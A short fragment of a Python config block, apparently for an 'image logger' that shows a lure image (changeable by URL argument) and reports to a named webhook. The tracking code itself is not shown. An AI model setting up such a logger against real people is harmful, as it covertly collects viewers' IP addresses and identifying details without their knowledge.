...
config = {
    ...
    "image": "https://i.pinimg.com/736x/43/40/f2/4340f22c73f90d539eefb9df27abbb80.jpg", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "abdul", # Set this to the name you want the webhook to have
